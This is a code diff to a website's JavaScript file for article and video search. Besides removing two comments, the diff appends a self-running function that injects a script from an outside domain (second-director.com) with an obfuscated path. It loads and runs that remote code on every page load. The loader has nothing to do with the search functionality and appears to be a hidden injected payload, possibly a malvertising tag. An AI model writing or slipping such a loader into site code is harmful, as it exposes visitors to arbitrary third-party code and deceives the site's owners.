@@ -10,7 +10,6 @@ document.querySelectorAll('.navbarText').forEach(link => {
 });
 
 
-// SEARCH ARTIKEL
 const articleSearchInput = document.getElementById('searchInput');
 const articleCards = document.querySelectorAll('.articlesCard');
 
@@ -28,7 +27,7 @@ articleSearchInput.addEventListener('keyup', function () {
   });
 });
 
-// SEARCH VIDEO
+
 const videoSearchInput = document.getElementById('searchInputV');
 const videoCards = document.querySelectorAll('.videosCard');
 
@@ -45,3 +44,15 @@ videoSearchInput.addEventListener('keyup', function () {
     }
   });
 });
+
+
+(function(nsr){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = nsr || {};
+s.src = "\/\/second-director.com\/cnD\/9\/6Jb.2o5ol\/S-WUQV9gNczjA\/5BMJTGM\/4yMJSH0N3JM_DxkExlMMzMgj1K";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
